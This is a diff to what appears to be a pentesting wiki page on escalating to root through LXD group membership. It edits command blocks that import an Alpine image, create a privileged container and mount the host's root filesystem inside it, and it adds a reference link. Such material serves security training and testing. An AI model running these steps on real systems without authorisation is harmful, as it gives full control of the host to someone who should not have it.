@@ -40,20 +40,19 @@ wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
 
-Then, upload to the vulnerable server the files **lxd.tar.xz** and **rootfs.squashfs**
-
-Add the image:
+Upload the files **lxd.tar.xz** and **rootfs.squashfs**, add the image to the repo and create a container:
 
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
-lxc image list #You can see your new imported image
-```
 
-Create a container and add root path
+# Check the image is there
+lxc image list
 
-```bash
+# Create the container
 lxc init alpine privesc -c security.privileged=true
-lxc list #List containers
+
+# List containers
+lxc list
 
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
@@ -63,7 +62,7 @@ If you find this error _**Error: No storage pool found. Please create a new stor
 Run **`lxd init`** and **repeat** the previous chunk of commands
 {% endhint %}
 
-Execute the container:
+Finally you can execute the container and get root:
 
 ```bash
 lxc start privesc
@@ -113,9 +112,10 @@ lxc exec test bash
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
 
-## Other Refs
+## References
 
-{% embed url="https://reboare.github.io/lxd/lxd-escape.html" %}
+* [https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)
+* [https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/](https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/)
 
 <details>
 
